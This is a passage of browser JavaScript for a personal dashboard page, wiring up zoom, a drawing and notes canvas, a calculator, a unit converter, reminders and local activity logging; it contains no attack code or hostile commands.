            document.documentElement.requestFullscreen().catch(err => {
              showAlert(`Error attempting to enable full-screen mode: ${err.message}`, 'error');
            });
          } else {
            document.exitFullscreen();
          }
        });
        
        // Zoom functionality is applied in applyZoom, and buttons handle level change
        document.getElementById('zoomInBtn').addEventListener('click', () => {
          trackActivity('Button Click', 'Zoom In button clicked');
          trackStats('button');
          this.setZoom(this.zoomLevel + 0.1);
        });

        document.getElementById('zoomOutBtn').addEventListener('click', () => {
          trackActivity('Button Click', 'Zoom Out button clicked');
          trackStats('button');
          this.setZoom(this.zoomLevel - 0.1);
        });

        document.getElementById('logoutBtn').addEventListener('click', () => {
          trackActivity('Button Click', 'Logout button clicked');
          trackStats('button');
          if(confirm('Are you sure you want to log out?')) {
            localStorage.setItem('lastSuccessfulLogin', new Date().toISOString()); // Save last login on logout
            window.location.reload(); // Simple refresh to return to login screen
          }
        });

        document.getElementById('activityLogsBtn').addEventListener('click', () => {
            this.togglePanel('activityHistoryPanel', document.getElementById('activityLogsBtn'));
            trackActivity('Button Click', 'Activity Logs (Dashboard) button clicked');
            trackStats('button');
        });
        document.getElementById('loginHistoryDashBtn').addEventListener('click', () => {
          this.togglePanel('loginHistoryPanel', document.getElementById('loginHistoryDashBtn'));
          trackActivity('Button Click', 'Login History (Dashboard) button clicked');
          trackStats('button');
          this.updateLoginHistoryDisplay();
        });
        document.getElementById('downloadActivityLogsBtn').addEventListener('click', () => {
          trackActivity('Button Click', 'Download Activity Logs button clicked');
          trackStats('button');
          this.downloadActivityLogs();
        });
        document.getElementById('settingsBtn').addEventListener('click', () => {
          this.togglePanel('settingsPanel', document.getElementById('settingsBtn'));
          trackActivity('Button Click', 'Settings button clicked');
          trackStats('button');
        });
        document.getElementById('calculatorBtn').addEventListener('click', () => {
            this.togglePanel('calculator', document.getElementById('calculatorBtn'));
            trackActivity('Button Click', 'Calculator button clicked');
            trackStats('button');
        });
        document.getElementById('unitConverterBtn').addEventListener('click', () => {
            this.togglePanel('unitConverter', document.getElementById('unitConverterBtn'));
            trackActivity('Button Click', 'Unit Converter button clicked');
            trackStats('button');
        });
        document.getElementById('mediaPlayerBtn').addEventListener('click', () => {
            this.togglePanel('mediaPlayer', document.getElementById('mediaPlayerBtn'));
            trackActivity('Button Click', 'Media Player button clicked');
            showAlert("Note: For network-restricted sites (like school filters for YouTube), a client-side solution cannot provide a true proxy bypass. This embedded player will only work if your network allows access to YouTube directly.", 'warning', 10000);
            trackStats('button');
        });
        document.getElementById('keybindsBtn').addEventListener('click', () => {
            this.togglePanel('keybindsPanel', document.getElementById('keybindsBtn'));
            trackActivity('Button Click', 'Keybinds button clicked');
            trackStats('button');
        });
        document.getElementById('timerBtn').addEventListener('click', () => {
            this.togglePanel('timeToolsPanel', document.getElementById('timerBtn'));
            trackActivity('Button Click', 'Time Tools button clicked');
            trackStats('button');
        });
        document.getElementById('reminderBtn').addEventListener('click', () => {
            this.togglePanel('reminderPanel', document.getElementById('reminderBtn'));
            trackActivity('Button Click', 'Reminder button clicked');
            trackStats('button');
        });
        document.getElementById('statsBtn').addEventListener('click', () => {
            this.togglePanel('statsPanel', document.getElementById('statsBtn'));
            trackActivity('Button Click', 'Stats button clicked');
            trackStats('button');
            this.updateStatsDisplay(); // Ensure display is updated when opened
        });

      },

      setZoom: function(newLevel) {
          const minZoom = 0.5;
          const maxZoom = 2;
          this.zoomLevel = Math.max(minZoom, Math.min(maxZoom, newLevel));
          document.body.style.zoom = this.zoomLevel;
          localStorage.setItem('dashboardZoom', this.zoomLevel);
          trackActivity('Zoom Change', `Zoom set to: ${this.zoomLevel}`);
      },
      applyZoom: function() {
          document.body.style.zoom = this.zoomLevel;
      },
      downloadActivityLogs: function() {
          const content = activityLog.map(entry => `[${entry.timestamp}] ${entry.type}: ${entry.description}`).join('\n');
          const blob = new Blob([content], { type: 'text/plain' });
          const a = document.createElement('a');
          a.href = URL.createObjectURL(blob);
          a.download = `activity_log_${new Date().toISOString()}.txt`;
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
          showAlert('Activity logs downloaded!', 'success');
      },
      
      // Initialize canvas
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainContentAreas = [document.getElementById('mainGrid'), document.getElementById('updatesNotifications'), document.getElementById('additionalPanels'), document.querySelector('.quick-info-buttons')]; // Consolidated sections

        notesBtn.addEventListener('click', () => {
          trackActivity('Button Click', 'Notes button clicked');
          trackStats('button');
          mainContentAreas.forEach(el => { if(el) el.style.display = 'none'; }); // Hide other dashboard sections
          canvasContainer.style.display = 'block';
        });

        document.getElementById('closeCanvasBtn').addEventListener('click', () => {
          trackActivity('Button Click', 'Close Notes button clicked');
          trackStats('button');
          canvasContainer.style.display = 'none';
          mainContentAreas.forEach(el => { 
            if(el) {
                // Restore default display types for flex items
                if (el.id === 'mainGrid' || el.id === 'updatesNotifications' || el.id === 'additionalPanels' || el.classList.contains('quick-info-buttons')) {
                    el.style.display = 'flex';
                } else {
                    el.style.display = 'block';
                }
            }
          });
        });

        const clearCanvasBtn = document.getElementById('clearCanvasBtn');
        const noteColorInput = document.getElementById('noteColor');
        const noteThicknessInput = document.getElementById('noteThickness');
        const toggleEraserBtn = document.getElementById('toggleEraserBtn');
        const addTextNoteBtn = document.getElementById('addTextNoteBtn');
        const saveCanvasBtn = document.getElementById('saveCanvasBtn');


        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');

        // Set initial canvas background
        ctx.fillStyle = '#fff';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        let drawing = false;
        let isEraser = false;
        let penColor = noteColorInput.value;
        let penThickness = noteThicknessInput.value;

        // Update pen properties
        noteColorInput.addEventListener('change', (e) => {
            penColor = e.target.value;
            ctx.strokeStyle = penColor;
            isEraser = false;
            toggleEraserBtn.textContent = ' Eraser';
            trackActivity('Notes Tool Change', `Pen color changed to ${penColor}`);
            trackStats('noteEdit');
        });
        noteThicknessInput.addEventListener('change', (e) => {
            penThickness = e.target.value;
            ctx.lineWidth = penThickness;
            trackActivity('Notes Tool Change', `Pen thickness changed to ${penThickness}`);
            trackStats('noteEdit');
        });

        // Toggle Eraser
        toggleEraserBtn.addEventListener('click', () => {
            isEraser = !isEraser;
            toggleEraserBtn.textContent = isEraser ? ' Pen' : ' Eraser';
            if (isEraser) {
                ctx.strokeStyle = '#fff'; // Eraser color matches canvas background
                ctx.globalCompositeOperation = 'destination-out'; // Erase effect
            } else {
                ctx.strokeStyle = penColor;
                ctx.globalCompositeOperation = 'source-over'; // Normal drawing
            }
            ctx.lineWidth = penThickness; // Eraser uses current thickness
            trackActivity('Notes Tool Change', `Eraser toggled: ${isEraser ? 'On' : 'Off'}`);
            trackStats('noteEdit');
            trackStats('button');
            trackStats('toggle');
        });


        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          const scaleX = canvas.width / rect.width;
          const scaleY = canvas.height / rect.height;
          return {
            x: ((evt.clientX || evt.touches[0].clientX) - rect.left) * scaleX,
            y: ((evt.clientY || evt.touches[0].clientY) - rect.top) * scaleY
          };
        }

        canvas.addEventListener('mousedown', (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          e.preventDefault();
          trackActivity('Canvas Interaction', 'Started drawing on canvas');
          trackStats('noteEdit');
        });

        canvas.addEventListener('touchstart', (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          e.preventDefault();
          trackActivity('Canvas Interaction', 'Started drawing on canvas (touch)');
          trackStats('noteEdit');
        });

        canvas.addEventListener('mousemove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.lineCap = 'round';
          ctx.lineJoin = 'round'; // Smoother lines
          ctx.stroke();
          e.preventDefault();
        });

        canvas.addEventListener('touchmove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.lineCap = 'round';
          ctx.lineJoin = 'round'; // Smoother lines
          ctx.stroke();
          e.preventDefault();
        });

        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
          canvas.addEventListener(evtName, () => {
            drawing = false;
            // Ensure globalCompositeOperation is reset to default when not erasing
            if (isEraser && evtName.includes('up')) {
                 ctx.globalCompositeOperation = 'source-over';
                 ctx.strokeStyle = penColor; // Restore original pen color context
            }
          });
        });

        clearCanvasBtn.addEventListener('click', () => {
          trackActivity('Button Click', 'Clear Canvas button clicked');
          trackStats('button');
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = '#fff';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          // Restore drawing context if eraser was active
          ctx.globalCompositeOperation = 'source-over';
          isEraser = false;
          toggleEraserBtn.textContent = ' Eraser';
          ctx.strokeStyle = penColor;
        });

        // Add Text Notes
        const notesTextPopup = document.getElementById('notesTextPopup');
        const notesTextInput = document.getElementById('notesTextInput');
        const notesTextAddBtn = document.getElementById('notesTextAddBtn');
        const notesTextCancelBtn = document.getElementById('notesTextCancelBtn');
        let textNotePos = {x: canvas.width / 2, y: canvas.height / 2}; // Default position

        addTextNoteBtn.addEventListener('click', () => {
            trackActivity('Button Click', 'Add Text Note button clicked');
            trackStats('button');
            notesTextInput.value = '';
            notesTextPopup.style.display = 'block';
            notesTextInput.focus();
        });
        notesTextCancelBtn.addEventListener('click', () => {
            trackActivity('Button Click', 'Cancel Text Note button clicked');
            trackStats('button');
            notesTextPopup.style.display = 'none';
        });
        notesTextAddBtn.addEventListener('click', () => {
            const text = notesTextInput.value.trim();
            if (text) {
                ctx.fillStyle = penColor; // Use current pen color for text
                ctx.font = `${penThickness * 3 + 12}px sans-serif`; // Base on thickness, make readable
                ctx.fillText(text, textNotePos.x, textNotePos.y);
                trackActivity('Notes Tool Action', `Added text note: "${text}"`);
                trackStats('noteEdit');
            }
            notesTextPopup.style.display = 'none';
        });
        
        saveCanvasBtn.addEventListener('click', () => {
            trackActivity('Button Click', 'Save Notes button clicked');
            trackStats('button');
            const link = document.createElement('a');
            link.download = `notes_${new Date().toLocaleDateString()}.png`;
            link.href = canvas.toDataURL('image/png');
            link.click();
            showAlert('Notes canvas saved!', 'success');
        });

        document.getElementById('screenshotBtn').addEventListener('click', () => {
          trackActivity('Button Click', 'Screenshot button clicked');
          trackStats('button');
          const elementToCapture = document.body; 
          html2canvas(elementToCapture).then(canvasImg => {
            const link = document.createElement('a');
            link.download = `dashboard_screenshot_${new Date().toISOString()}.png`;
            link.href = canvasImg.toDataURL('image/png');
            link.click();
          });
          showAlert('Screenshot captured and downloaded!', 'success');
        });
        
        document.getElementById('exportNotesBtn').addEventListener('click', () => {
          trackActivity('Button Click', 'Export Notes button clicked');
          trackStats('button');
          const link = document.createElement('a');
          link.download = `notes_canvas_${new Date().toISOString()}.png`;
          link.href = canvas.toDataURL('image/png');
          link.click();
          showAlert('Notes canvas exported!', 'success');
        });

        const toggleBtn = document.getElementById('toggleSectionsBtn');
        toggleBtn.addEventListener('click', () => {
          trackActivity('Button Click', 'Toggle Sections button clicked');
          trackStats('button');
          const gridItems = [mainGrid, updatesNotifications, additionalPanels, document.querySelector('.quick-info-buttons')]; // Consolidated sections
          let isVisible = false;
          // Check if any major grid is visible
          for(const item of gridItems) {
            if (item && (item.style.display === 'flex' || item.style.display === '')) {
              isVisible = true;
              break;
            }
          }

          if (isVisible) {
            gridItems.forEach(item => { if(item) item.style.display = 'none'; });
            toggleBtn.innerText = ' Show All Sections';
            trackStats('panelsClosed');
            showAlert('All main dashboard sections hidden.', 'info');
          } else {
            // Restore default display types for flex items
            gridItems.forEach(item => {
                if(item) item.style.display = 'flex'; // Restore as flex container
            });
            toggleBtn.innerText = ' Hide All Sections';
            trackStats('panelsOpened');
            showAlert('All main dashboard sections shown.', 'info');
          }
        });
      },
      
      // Initialize panels - Ensures all custom info-panels are hidden initially
      initPanels: function() {
        // Consolidated selector for all panel types to ensure they are hidden
        document.querySelectorAll('.box, #canvasContainer, .info-panel, .settings-panel, .utility-panel, .notes-content, .activity-history-panel, .keybinds-panel, .login-history-panel, .reminder-panel, .time-tools-panel').forEach(panel => {
          panel.style.display = 'none';
          panel.classList.remove('active-panel'); // Remove active state
          panel.style.zIndex = ''; // Reset z-index
        });
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        // Ensure the main grids (non-toggleable panels by category) are visible by default
        document.getElementById('mainGrid').style.display = 'flex';
        document.getElementById('updatesNotifications').style.display = 'flex';
        document.getElementById('additionalPanels').style.display = 'flex';
        document.querySelector('.quick-info-buttons').style.display = 'flex'; // Ensure these buttons are visible

        document.getElementById('alertContainer').style.display = 'flex'; // Make alert system visible
      },
      
      // Toggle visibility of specific info panels
      togglePanel: function(panelId, callingButton = null) {
        const panel = document.getElementById(panelId);
        if(!panel) return;
        trackStats('button');

        // Close currently active panel if a new one is being opened and they are different
        if (this.activePanelElement && this.activePanelElement.id !== panelId) {
            this.activePanelElement.style.display = 'none';
            if(this.activePanelElement.callingButton) this.activePanelElement.callingButton.classList.remove('active');
            this.activePanelElement.style.zIndex = '';
            trackActivity('Panel Closed', `Panel "${this.activePanelElement.id}" closed (auto)`);
            trackStats('panelsClosed');
        }

        if (panel.style.display === 'none') {
          panel.style.display = 'block';
          this.activePanelElement = panel;
          this.activePanelElement.callingButton = callingButton;
          if(callingButton) callingButton.classList.add('active');
          trackActivity('Panel Opened', `Panel "${panelId}" opened`);
          trackStats('panelsOpened');
          // Bring to front
          panel.style.zIndex = 1000;
        } else {
          panel.style.display = 'none';
          this.activePanelElement = null;
          if(callingButton) callingButton.classList.remove('active');
          panel.style.zIndex = '';
          trackActivity('Panel Closed', `Panel "${panelId}" closed (manual)`);
          trackStats('panelsClosed');
        }
      },
      
      showIpadContent: function(contentId) {
        trackActivity('iPad Content Toggle', `Toggled iPad content to "${contentId}"`);
        trackStats('toggle');
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1)).style.display = 'block';
      },
      
      showBypassContent: function(contentId) {
        trackActivity('Bypass Content Toggle', `Toggled bypass content to "${contentId}"`);
        trackStats('toggle');
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById(contentId + 'Bypass').style.display = 'block';
      },

      initSearch: function() {
        const searchBar = document.getElementById('searchBar');
        const searchButton = document.getElementById('searchButton');
        const scrollOptions = { behavior: 'smooth', block: 'start' };

        searchButton.addEventListener('click', () => performSearch());
        searchBar.addEventListener('keydown', (e) => {
          if (e.key === 'Enter') {
            performSearch();
            trackActivity('Search', `Performed search for "${searchBar.value}"`);
            trackStats('button'); 
          }
        });

        function performSearch() {
          const query = searchBar.value.toLowerCase().trim();
          if (!query) return;

          const elementsToSearch = [
            document.getElementById('calendarBox'),
            document.getElementById('motivationBox'),
            document.getElementById('randomFactBox'),
            document.getElementById('dailyQuoteBox'),
            document.getElementById('updatesBox'),
            document.getElementById('notificationsBox'),
            document.getElementById('buttonsArea'),
            // All info panels and other draggable components
            ...document.querySelectorAll('.info-panel, .utility-panel, .settings-panel, .activity-history-panel, .keybinds-panel, .login-history-panel, .reminder-panel, .time-tools-panel, #canvasContainer')
          ];

          let found = false;
          for (const el of elementsToSearch) {
            if (!el) continue; // Skip if element is null

            // Check ID
            if (el.id && el.id.toLowerCase().includes(query)) {
              el.scrollIntoView(scrollOptions);
              el.style.border = '2px solid yellow'; // Highlight
              setTimeout(() => el.style.border = '1px solid transparent', 3000); // Remove highlight
              // If it's a hidden info-panel, also toggle it open
              if (el.style.display === 'none') {
                  dashboard.togglePanel(el.id);
              }
              found = true;
              showAlert(`Found "${query}" in section: ${el.querySelector('h2')?.textContent || el.id}`, 'success');
              break;
            }
            // Check text content (might be too broad, but useful)
            if (el.textContent.toLowerCase().includes(query)) {
              el.scrollIntoView(scrollOptions);
              el.style.border = '2px solid orange';
              setTimeout(() => el.style.border = '1px solid transparent', 3000);
               if (el.style.display === 'none') {
                  dashboard.togglePanel(el.id);
               }
              found = true;
              showAlert(`Found "${query}" in content of section: ${el.querySelector('h2')?.textContent || el.id}`, 'success');
              break;
            }
          }

          if (!found) {
            showAlert(`No results found for "${query}".`, 'warning');
          }
          searchBar.value = '';
        }
      },

      addDraggablePanels: function() {
          // Select all panels that can be moved
          const panels = document.querySelectorAll('.box.draggable, #canvasContainer.draggable, .info-panel.draggable, .settings-panel.draggable, .utility-panel.draggable, .activity-history-panel.draggable, .keybinds-panel.draggable, .login-history-panel.draggable, .reminder-panel.draggable, .time-tools-panel.draggable');
          panels.forEach(panel => {
              addDragListeners(panel);
          });
      },

      initCalculator: function() {
        const display = document.getElementById('calcDisplay');
        const calcGrid = document.querySelector('#calculator .calculator-grid');
        if (!display || !calcGrid) return; // Guard clause
        let currentInput = '';
        let operator = null;
        let prevInput = '';
        let resetDisplay = false;

        calcGrid.addEventListener('click', (e) => {
            const button = e.target;
            if (!button.tagName === 'BUTTON') return;
            trackActivity('Calculator Input', `Pressed ${e.target.textContent}`);
            trackStats('button');
            
            const value = button.textContent;

            if (button.classList.contains('clear')) {
                currentInput = '';
                prevInput = '';
                operator = null;
                display.value = '0';
                return;
            }
            if (value === '+/-') {
                if (currentInput) currentInput = String(parseFloat(currentInput) * -1);
                else if (display.value && display.value !== '0') currentInput = String(parseFloat(display.value) * -1);
                display.value = currentInput || '0';
                return;
            }
            if (value === '%') {
                if (currentInput) currentInput = String(parseFloat(currentInput) / 100);
                else if (display.value && display.value !== '0') currentInput = String(parseFloat(display.value) / 100);
                display.value = currentInput || '0';
                return;
            }


            if (button.classList.contains('operator')) {
                if (currentInput === '' && prevInput === '') return; // No number entered yet

                if (currentInput !== '') {
                    if (prevInput === '') {
                        prevInput = currentInput;
                    } else if (operator) {
                        prevInput = this.calculate(parseFloat(prevInput), parseFloat(currentInput), operator);
                        if (String(prevInput).includes('Error')) { // Handle division by zero
                            display.value = prevInput;
                            currentInput = ''; prevInput = ''; operator = null;
                            return;
                        }
                    }
                }
                operator = value;
                currentInput = '';
                display.value = prevInput; // Show result of previous calculation, or first number
                resetDisplay = true;
                return;
            }

            if (button.classList.contains('equals')) {
                if (currentInput === '' || prevInput === '' || !operator) return;
                currentInput = this.calculate(parseFloat(prevInput), parseFloat(currentInput), operator);
                if (String(currentInput).includes('Error')) {
                    display.value = currentInput;
                } else {
                    display.value = currentInput;
                    prevInput = currentInput;
                    currentInput = '';
                    operator = null;
                }
                resetDisplay = true;
                return;
            }

            // Number or dot
            if (resetDisplay) {
                currentInput = '';
                resetDisplay = false;
            }
            if (value === '.' && currentInput.includes('.')) return;
            currentInput += value;
            display.value = currentInput;
        });
      },
      calculate: function(num1, num2, op) {
        switch (op) {
            case '+': return String(num1 + num2);
            case '-': return String(num1 - num2);
            case '*': return String(num1 * num2);
            case '/': 
                if (num2 === 0) {
                    showAlert("Cannot divide by zero!", 'error');
                    return "Error: Division by zero";
                }
                return String(num1 / num2);
            default: return '';
        }
      },
      initUnitConverter: function() {
        const conversionTypeSelect = document.getElementById('conversionType');
        const fromUnitSelect = document.getElementById('fromUnit');
        const toUnitSelect = document.getElementById('toUnit');
        const convertInput = document.getElementById('convertInput');
        const convertOutput = document.getElementById('convertOutput');
        const performConversionBtn = document.getElementById('performConversionBtn');
        const swapUnitsBtn = document.getElementById('swapUnitsBtn');

        if (!conversionTypeSelect || !fromUnitSelect || !toUnitSelect || !convertInput || !convertOutput || !performConversionBtn || !swapUnitsBtn) return; // Guard clause

        const units = {
            length: {
                meters: 1, // Base unit
                kilometers: 1000,
                centimeters: 0.01,
                millimeters: 0.001,
                miles: 1609.34,
                yards: 0.9144,
                feet: 0.3048,
                inches: 0.0254
            },
            weight: {
                kilograms: 1, // Base unit
                grams: 0.001,
                milligrams: 0.000001,
                pounds: 0.453592,
                ounces: 0.0283495
            },
            temperature: {
                celsius: 1, // Placeholder; conversion logic is different
                fahrenheit: 1,
                kelvin: 1
            }
        };

        const temperatureConversions = {
            celsiusToFahrenheit: (c) => (c * 9/5) + 32,
            fahrenheitToCelsius: (f) => (f - 32) * 5/9,
            celsiusToKelvin: (c) => c + 273.15,
            kelvinToCelsius: (k) => k - 273.15,
            fahrenheitToKelvin: (f) => (f - 32) * 5/9 + 273.15,
            kelvinToFahrenheit: (k) => (k - 273.15) * 9/5 + 32
        };


        function populateUnits() {
            trackActivity('Converter Init', `Populating units for ${conversionTypeSelect.value}`);
            const type = conversionTypeSelect.value;
            const currentUnits = units[type];

            fromUnitSelect.innerHTML = '';
            toUnitSelect.innerHTML = '';

            for (const unit in currentUnits) {
                const optionFrom = document.createElement('option');
                optionFrom.value = unit;
                optionFrom.textContent = unit.charAt(0).toUpperCase() + unit.slice(1); // Capitalize first letter
                fromUnitSelect.appendChild(optionFrom);

                const optionTo = document.createElement('option');
                optionTo.value = unit;
                optionTo.textContent = unit.charAt(0).toUpperCase() + unit.slice(1);
                toUnitSelect.appendChild(optionTo);
            }

            if (type === 'temperature') { // Select common defaults for temp
                fromUnitSelect.value = 'celsius';
                toUnitSelect.value = 'fahrenheit';
            } else { // Set default for length/weight to avoid same unit selection if possible
                if (fromUnitSelect.options.length > 0) fromUnitSelect.value = fromUnitSelect.options[0].value;
                if (toUnitSelect.options.length > 1) toUnitSelect.value = toUnitSelect.options[1].value;
                else if (toUnitSelect.options.length > 0) toUnitSelect.value = toUnitSelect.options[0].value;
            }
        }

        function convertUnits() {
            trackActivity('Converter Action', `Converting units for ${conversionTypeSelect.value}`);
            trackStats('button'); // Considering a conversion click a button stat
            const type = conversionTypeSelect.value;
            const value = parseFloat(convertInput.value);
            const fromUnit = fromUnitSelect.value;
            const toUnit = toUnitSelect.value;

            if (isNaN(value)) {
                convertOutput.value = 'Invalid input';
                return;
            }

            let result;
            if (type === 'temperature') {
                if (fromUnit === toUnit) {
                    result = value;
                } else if (fromUnit === 'celsius' && toUnit === 'fahrenheit') {
                    result = temperatureConversions.celsiusToFahrenheit(value);
                } else if (fromUnit === 'fahrenheit' && toUnit === 'celsius') {
                    result = temperatureConversions.fahrenheitToCelsius(value);
                } else if (fromUnit === 'celsius' && toUnit === 'kelvin') {
                    result = temperatureConversions.celsiusToKelvin(value);
                } else if (fromUnit === 'kelvin' && toUnit === 'celsius') {
                    result = temperatureConversions.kelvinToCelsius(value);
                } else if (fromUnit === 'fahrenheit' && toUnit === 'kelvin') {
                    result = temperatureConversions.fahrenheitToKelvin(value);
                } else if (fromUnit === 'kelvin' && toUnit === 'fahrenheit') {
                    result = temperatureConversions.kelvinToFahrenheit(value);
                }
            } else {
                // Generic conversion for length, weight (based on factor to base unit)
                const fromFactor = units[type][fromUnit];
                const toFactor = units[type][toUnit];

                if (!fromFactor || !toFactor) {
                    convertOutput.value = 'Error: Unit not found';
                    return;
                }
                
                result = (value * fromFactor) / toFactor;
            }
            
            convertOutput.value = result !== undefined ? result.toFixed(4) : 'Error converting';
        }

        function swapUnits() {
            trackActivity('Converter Action', 'Swapped units');
            trackStats('button');
            const tempFrom = fromUnitSelect.value;
            fromUnitSelect.value = toUnitSelect.value;
            toUnitSelect.value = tempFrom;
            convertUnits(); // Recalculate after swapping
        }

        conversionTypeSelect.addEventListener('change', populateUnits);
        performConversionBtn.addEventListener('click', convertUnits);
        swapUnitsBtn.addEventListener('click', swapUnits);
        convertInput.addEventListener('input', convertUnits); // Live conversion
        fromUnitSelect.addEventListener('change', convertUnits);
        toUnitSelect.addEventListener('change', convertUnits);

        populateUnits(); // Initial population
      },

      initKeybinds: function() {
        // Simple display/interaction for keybinds, actual implementation would involve
        // attaching global event listeners and custom logic to override them.
        document.querySelectorAll('.keybinds-entry input').forEach(input => {
            input.addEventListener('focus', (e) => {
                input.value = 'Press key(s)...';
                trackActivity('Keybinds UI', `Focused on keybind input for ${e.target.dataset.action}`);
            });
            input.addEventListener('keydown', (e) => {
                e.preventDefault(); // Prevent default browser actions
                let key = e.key;
                const modifiers = [];
                if (e.ctrlKey) modifiers.push('Ctrl');
                if (e.shiftKey) modifiers.push('Shift');
                if (e.altKey) modifiers.push('Alt');
                if (e.metaKey) modifiers.push('Meta'); // Command key on Mac

                if (['Control', 'Shift', 'Alt', 'Meta'].includes(key)) { // Don't show only modifier keys
                  key = '';
                }

                let keybind = [...modifiers, key.split('+').pop()].filter(Boolean).join('+');
                e.target.value = keybind;
                trackActivity('Keybind Configuration', `Keybind for ${e.target.dataset.action} set to: ${keybind}`);
                trackStats('noteEdit'); // Treat changing keybind as an edit for stats
            });
            input.addEventListener('blur', (e) => {
                if (e.target.value === 'Press key(s)...' || !e.target.value) {
                    e.target.value = e.target.dataset.originalValue || ''; // Restore if nothing was pressed
                }
            });
            input.dataset.originalValue = input.value; // Store original value
        });
      },

      initStatsTracker: function() {
          // This simply makes sure the current stats are displayed when the panel is opened
          // The tracking itself is handled by global `trackStats` and `updateInteractionTime`
          document.getElementById('statsBtn')?.addEventListener('click', () => {
            updateStatsDisplay(); // Update stats display when panel is opened
          });
      },

      initReminderSystem: function() {
        const reminderDateTimeInput = document.getElementById('reminderDateTime');
        const reminderMessageInput = document.getElementById('reminderMessage');
        const setReminderBtn = document.getElementById('setReminderBtn');
        const upcomingRemindersDiv = document.getElementById('upcomingReminders');
        if (!reminderDateTimeInput || !reminderMessageInput || !setReminderBtn || !upcomingRemindersDiv) return; // Guard clause

        let reminders = JSON.parse(localStorage.getItem('dashboardReminders')) || [];

        function saveReminders() {
            localStorage.setItem('dashboardReminders', JSON.stringify(reminders));
        }

        function renderReminders() {
            upcomingRemindersDiv.innerHTML = '';
            if (reminders.length === 0) {
                upcomingRemindersDiv.innerHTML = '<p style="color:#aaa;">No reminders set.</p>';
                return;
            }
            reminders = reminders.filter(r => !r.dismissed || new Date(r.time) > new Date()); // Filter out old dismissed ones

            reminders.sort((a, b) => new Date(a.time) - new Date(b.time)); // Sort by time

            reminders.forEach((r, index) => {
                const now = new Date();
                const reminderTime = new Date(r.time);
                
                // Clear existing timeout if any, to avoid duplicates on rerender
                if (r.timerId) clearTimeout(r.timerId);

                if (reminderTime < now && !r.dismissed) {
                  // If reminder time has passed and not dismissed, show alert now
                  showAlert(`REMINDER: ${r.message} (was due at ${reminderTime.toLocaleString()})`, 'warning', 10000);
                  r.dismissed = true; // Mark as dismissed so it doesn't alert again this session
                  saveReminders();
                }

                if (reminderTime >= now || (reminderTime < now && r.dismissed)) { // Only show active reminders or dismissed past ones
                  const div = document.createElement('div');
                  div.className = 'activity-log-entry'; // Reuse styling
                  const statusText = reminderTime < now ? "(Dismissed/Past Due)" : "";
                  div.innerHTML = `
                      <strong>${reminderTime.toLocaleString()}:</strong> ${r.message} ${statusText}
                      <button class="alert-close" data-index="${index}" style="margin-left:auto;"></button>
                  `;
                  upcomingRemindersDiv.appendChild(div);
                }

                if (reminderTime > now && !r.timerId) { // Only set new timeout if not already running and is in future
                    const timeUntilReminder = reminderTime.getTime() - now.getTime();
                    if (timeUntilReminder > 0) {
                        r.timerId = setTimeout(() => {
                            showAlert(`REMINDER: ${r.message}`, 'info', 7000);
                            r.dismissed = true;
                            saveReminders();
                            renderReminders(); // Rerender to update dismissed state/remove from list
                            trackActivity('Reminder Triggered', `Reminder "${r.message}" fired`);
                        }, timeUntilReminder);
                    }
                }
            });

            // Add dismiss listeners for dynamically added buttons
            upcomingRemindersDiv.querySelectorAll('.alert-close').forEach(btn => {
                btn.addEventListener('click', (e) => {
                    const index = parseInt(e.target.dataset.index);
                    const removedReminder = reminders.splice(index, 1)[0];
                    if (removedReminder && removedReminder.timerId) {
                        clearTimeout(removedReminder.timerId);
                    }
                    saveReminders();
                    renderReminders();
                    trackActivity('Reminder Action', `Reminder "${removedReminder.message}" dismissed`);
                    showAlert('Reminder dismissed!', 'success', 3000);
                });
            });
        }

        setReminderBtn.addEventListener('click', () => {
            trackActivity('Button Click', 'Set Reminder button clicked');
            trackStats('button');
            const dateTime = reminderDateTimeInput.value;
            const message = reminderMessageInput.value.trim();

            if (!dateTime || !message) {
                showAlert('Please fill both date/time and message for the reminder.', 'error');
                return;
            }
            const reminderTime = new Date(dateTime);
            if (isNaN(reminderTime.getTime()) || reminderTime < new Date()) {
                showAlert('Please enter a valid future date and time for the reminder.', 'error');
                return;
            }

            reminders.push({ time: dateTime, message: message, dismissed: false });
            saveReminders();
            renderReminders();
            reminderDateTimeInput.value = '';
            reminderMessageInput.value = '';
            showAlert(`Reminder set for: ${new Date(dateTime).toLocaleString()}`, 'success');
            trackActivity('Reminder Set', `Reminder for "${message}" set for ${new Date(dateTime).toLocaleString()}`);
        });

        // Initialize display and setup future reminders
        renderReminders();
      },

      initTimeTools: function() {
        const stopwatchDisplay = document.getElementById('stopwatchDisplay');
        const timerDisplay = document.getElementById('timerDisplay');
        const countdownDisplay = document.getElementById('countdownDisplay');
        const showStopwatchBtn = document.getElementById('showStopwatch');
        const showTimerBtn = document.getElementById('showTimer');
        const showCountdownBtn = document.getElementById('showCountdown');
        const stopwatchControls = document.getElementById('stopwatchControls');
        const timerControls = document.getElementById('timerControls');
        const countdownControls = document.getElementById('countdownControls');
        const timerInput = document.getElementById('timerInput');
        const startTimerBtn = document.getElementById('startTimerBtn');
        const pauseTimerBtn = document.getElementById('pauseTimerBtn');
        const resetTimerBtn = document.getElementById('resetTimerBtn');
        const countdownInput = document.getElementById('countdownInput');
        const startCountdownBtn = document.getElementById('startCountdownBtn');
        const pauseCountdownBtn = document.getElementById('pauseCountdownBtn');
